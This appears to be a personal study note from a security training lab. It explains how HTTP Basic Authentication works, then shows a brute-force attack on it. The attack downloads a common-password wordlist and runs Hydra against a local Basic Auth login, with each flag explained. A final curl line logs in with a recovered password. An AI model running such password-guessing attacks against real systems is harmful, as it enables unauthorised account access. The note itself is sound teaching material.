- Basic HTTP Authentication, or simply `Basic Auth`, is a **rudimentary yet common method for securing resources on the web.**
- In essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources.
- The process begins when a user attempts to access a restricted area. 
- The **server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the user's browser to present a login** dialog.
- Once the user **==provides their username and password, the browser concatenates them into a single string, separated by a colon.==**
- This string is then **encoded using Base64 and included in the `Authorization` header of subsequent requests**, following the format `Basic <encoded_credentials>`.

	![[Pasted image 20251021070328.png]]

- `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt`
- `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81`

	- `-l basic-auth-user`: This specifies that the username for the login attempt is 'basic-auth-user'.
	- `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.
	- `127.0.0.1`: This is the target IP address, in this case, the local machine (localhost).
	- `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').
	- `-s 81`: This ==**overrides the default port for the HTTP service**== and sets it to 81.
- Curl request for basic auth:
	- `curl 83.136.250.141:47032 -u "basic-auth-user:Password@123"`